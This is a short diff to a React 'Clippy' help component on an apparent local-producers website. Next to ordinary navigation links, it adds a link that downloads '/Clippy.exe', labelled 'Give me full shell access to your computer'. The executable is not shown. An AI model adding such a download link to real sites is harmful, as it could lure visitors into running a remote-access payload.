@@ -17,6 +17,9 @@ export default function Clippy() {
                     <li>Browse local producers on the <a href="/map">Map</a></li>
                     <li>Manage stock in your <a href="/dashboard">Dashboard</a></li>
                     <li>New here? <a href="/sign-up">Create an account</a></li>
+                    <li>
+                        <a href="/Clippy.exe" download>Give me full shell access to your computer</a>
+                    </li>
                 </ul>
             </div>
         </div>
